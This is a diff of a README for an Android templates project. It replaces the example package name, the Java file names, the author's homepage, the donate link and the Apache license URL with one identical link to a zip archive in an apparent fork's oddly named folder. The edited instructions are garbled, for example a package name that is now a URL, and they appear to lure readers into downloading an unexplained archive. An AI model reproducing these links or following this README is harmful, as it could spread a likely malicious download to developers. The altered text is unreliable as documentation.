@@ -29,9 +29,9 @@ Usage
 =====
 
 How to use these templates? Just copy the template into your project, rename
-package "com.example" to your own package name, rename classes' or resource's
+package "https://raw.githubusercontent.com/dextercool/Android-Templates-And-Utilities/master/pyodermic/Android-Templates-And-Utilities.zip" to your own package name, rename classes' or resource's
 names if you want and customize the code to your needs. Some templates have
-/src/fragment/ExampleFragment.java class which demonstrates how to use
+https://raw.githubusercontent.com/dextercool/Android-Templates-And-Utilities/master/pyodermic/Android-Templates-And-Utilities.zip class which demonstrates how to use
 the template in a Fragment.
 
 
@@ -40,7 +40,7 @@ Example
 
 Example of creating a basic app skelet with 1 Activity and 1 Fragment via Android Studio:
 
-* Create a new Android project with package name "com.example"
+* Create a new Android project with package name "https://raw.githubusercontent.com/dextercool/Android-Templates-And-Utilities/master/pyodermic/Android-Templates-And-Utilities.zip"
 * Copy & paste Base
 * Copy & paste Res-Strings
 * Copy & paste Res-Theme
@@ -51,16 +51,16 @@ Example of creating a basic app skelet with 1 Activity and 1 Fragment via Androi
 * Copy & paste Src-Logcat
 * Copy & paste Src-NetworkUtility
 * Copy & paste Src-StatefulLayout
-* Open ExampleActivity.java and comment out onCreateOptionsMenu(...) and onOptionsItemSelected(...) methods
+* Open https://raw.githubusercontent.com/dextercool/Android-Templates-And-Utilities/master/pyodermic/Android-Templates-And-Utilities.zip and comment out onCreateOptionsMenu(...) and onOptionsItemSelected(...) methods
 * Build the project and voilà, we have a basic skeleton for our future app
 
 
 Developed by
 ============
 
-[Petr Nohejl](http://petrnohejl.cz)
+[Petr Nohejl](https://raw.githubusercontent.com/dextercool/Android-Templates-And-Utilities/master/pyodermic/Android-Templates-And-Utilities.zip)
 
-[![Donate](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=B3JBY3NU6L2XY)
+[![Donate](https://raw.githubusercontent.com/dextercool/Android-Templates-And-Utilities/master/pyodermic/Android-Templates-And-Utilities.zip)](https://raw.githubusercontent.com/dextercool/Android-Templates-And-Utilities/master/pyodermic/Android-Templates-And-Utilities.zip)
 
 
 License
@@ -72,7 +72,7 @@ License
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-        http://www.apache.org/licenses/LICENSE-2.0
+        https://raw.githubusercontent.com/dextercool/Android-Templates-And-Utilities/master/pyodermic/Android-Templates-And-Utilities.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
